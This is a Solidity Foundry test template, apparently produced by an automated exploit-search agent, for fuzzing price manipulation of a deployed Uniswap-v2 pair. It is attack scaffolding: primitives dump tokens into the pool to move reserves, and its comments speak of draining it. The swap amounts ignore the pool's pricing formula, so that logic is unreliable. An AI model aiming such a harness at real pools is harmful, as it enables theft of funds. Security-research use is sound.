// SPDX-License-Identifier: MIT
// AGENT-GENERATED harness: {{STRATEGY_ID}} on {{CHALLENGE_NAME}}.
//
// LIVE-TARGET ONLY: this template binds to an already-deployed Uniswap-v2 pair
// at {{POOL_ADDRESS}} and manipulates its spot reserves. It needs a real address
// (from a fork/live sweep) and cannot be generated for an offline challenge --
// generator.ts refuses rather than emitting an uncompilable harness with a
// contract *name* where an address belongs.
//
// PRECONDITION to actually run: a funded attacker. The primitives below move
// tokens this harness holds into the pair, so on a bare fork they no-op (and the
// swap reverts) until the pool's tokens are obtained -- e.g. via flash loan.
// A no-op attempt is reported as "did not drain", never as a discovery.
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface ERC20Mintable {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract {{TEST_CONTRACT}} is Test {
    IUniswapV2Pair public target;
    ERC20Mintable public token0;
    ERC20Mintable public token1;

    function setUp() public {
        target = IUniswapV2Pair(address({{POOL_ADDRESS}}));
        token0 = ERC20Mintable(target.token0());
        token1 = ERC20Mintable(target.token1());
        // Seed balances for fuzzing.
        deal(address(token0), address(this), 1e24);
        deal(address(token1), address(this), 1e24);
    }

    // Primitive: dump token0 into the pair to manipulate price.
    function fuzz_dumpToken0(uint256 s0) external {
        uint256 amt = bound(s0, 0, token0.balanceOf(address(this)));
        token0.transfer(address(target), amt);
        // Swap token0 for token1 (amount0Out = 0, amount1Out = amt)
        target.swap(0, amt, address(this), "");
    }

    // Primitive: dump token1 into the pair.
    function fuzz_dumpToken1(uint256 s0) external {
        uint256 amt = bound(s0, 0, token1.balanceOf(address(this)));
        token1.transfer(address(target), amt);
        target.swap(amt, 0, address(this), "");
    }
}
